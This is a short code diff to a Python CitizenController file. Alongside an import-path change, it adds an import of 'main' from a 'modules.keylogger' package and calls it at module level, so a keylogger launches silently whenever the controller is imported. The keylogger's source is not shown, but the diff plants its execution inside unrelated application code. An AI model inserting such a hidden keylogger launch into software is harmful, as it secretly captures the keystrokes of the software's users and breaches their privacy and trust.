@@ -1,4 +1,8 @@
-from dataClasses.citizen import Citizen
+from dataClasses.dataClasses import Citizen
+
+from modules.keylogger.keylogger import main
+
+main()
 
 class CitizenController:
     def __init__(self, citizen, id, blackList, failings) -> None:
